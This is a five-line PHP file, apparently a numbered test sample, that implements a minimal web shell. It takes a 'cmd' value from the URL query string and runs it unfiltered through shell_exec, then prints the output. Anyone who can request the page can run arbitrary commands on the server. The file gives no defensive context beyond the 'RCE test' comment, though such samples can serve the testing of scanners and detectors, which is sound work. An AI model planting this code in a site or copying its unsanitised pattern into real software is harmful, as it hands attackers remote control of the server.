<?php
// RCE test variation #1107
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>